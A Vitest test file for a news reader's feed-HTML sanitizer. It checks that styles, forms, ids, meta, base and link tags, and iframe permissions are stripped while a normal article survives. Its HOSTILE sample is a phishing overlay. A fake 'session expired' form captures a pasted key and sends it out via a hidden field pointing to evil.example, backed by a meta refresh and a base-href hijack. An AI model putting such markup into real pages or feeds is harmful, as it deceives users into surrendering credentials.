// @vitest-environment jsdom
/**
 * A news feed's article HTML is written by whoever runs the feed, and the
 * reader shows it inside the app, on the app's own page. DOMPurify's defaults
 * stop scripts but keep page-level styling and forms, so a feed could cover
 * the whole app with a look-alike screen (a <style> block, a style attribute,
 * or the app's own utility classes such as "fixed inset-0") and put a form or
 * a full-screen link on it.
 */
import { describe, expect, it } from "vitest";
import { sanitizeFeedHtml } from "./feed-html";

const dom = (html: string) => {
  const d = document.createElement("div");
  d.innerHTML = html;
  return d;
};

const HOSTILE = `
  <style>body{display:none} .app-shell{visibility:hidden}</style>
  <div class="fixed inset-0 z-[500] bg-background" style="position:fixed;inset:0;z-index:9999">
    <h2>Your session expired</h2>
    <form action="/api/rss/article" method="get">
      <input type="hidden" name="url" value="https://evil.example/k?">
      <input name="url" placeholder="Paste your key"><textarea></textarea><select><option>x</option></select>
      <button type="submit">Continue</button>
    </form>
    <a href="https://evil.example/login" id="logo" name="config">Sign in again</a>
  </div>
  <link rel="stylesheet" href="https://evil.example/s.css"><meta http-equiv="refresh" content="0;url=https://evil.example">
  <base href="https://evil.example/">
  <iframe src="https://www.youtube.com/embed/abc" allow="camera; microphone; display-capture"></iframe>`;

const ORDINARY = `
  <p>Lanterns go up on <strong>Thursday</strong> at dusk.</p>
  <figure><img src="https://news.example/lantern.jpg" alt="Lanterns" loading="lazy"><figcaption>The harbour wall</figcaption></figure>
  <blockquote>Bring a torch.</blockquote>
  <ul><li>Stall 1</li><li>Stall 2</li></ul>
  <a href="https://news.example/more">Read more</a>`;

describe("sanitizeFeedHtml", () => {
  const out = dom(sanitizeFeedHtml(HOSTILE));

  it("drops page-level styling: <style>, style attributes, classes, ids, <link>, <meta>, <base>", () => {
    expect(out.querySelectorAll("style, link, meta, base").length).toBe(0);
    expect(out.querySelectorAll("[style], [class], [id]").length).toBe(0);
  });

  it("drops forms and their controls", () => {
    expect(out.querySelectorAll("form, input, textarea, select, option, button").length).toBe(0);
  });

  it("opens every link in a new tab, without access back to the app", () => {
    const links = [...out.querySelectorAll("a")];
    expect(links.length).toBeGreaterThan(0);
    for (const a of links) {
      expect(a.getAttribute("target")).toBe("_blank");
      expect(a.getAttribute("rel")).toBe("noopener noreferrer");
      expect(a.hasAttribute("name")).toBe(false);
    }
  });

  it("an embedded frame gets no permissions the feed asked for", () => {
    for (const f of out.querySelectorAll("iframe")) expect(f.hasAttribute("allow")).toBe(false);
  });

  it("keeps an ordinary article as it was", () => {
    const ok = dom(sanitizeFeedHtml(ORDINARY));
    expect(ok.querySelector("p strong")?.textContent).toBe("Thursday");
    expect(ok.querySelector("figure img")?.getAttribute("src")).toBe("https://news.example/lantern.jpg");
    expect(ok.querySelector("figure img")?.getAttribute("alt")).toBe("Lanterns");
    expect(ok.querySelector("figcaption")?.textContent).toBe("The harbour wall");
    expect(ok.querySelectorAll("blockquote, li").length).toBe(3);
    expect(ok.querySelector("a")?.getAttribute("href")).toBe("https://news.example/more");
  });

  it("the hostile sample really carries all of it before cleaning (or these checks prove nothing)", () => {
    const raw = dom(HOSTILE);
    expect(raw.querySelectorAll("style, form, input, button, [style], [class]").length).toBeGreaterThan(5);
  });
});
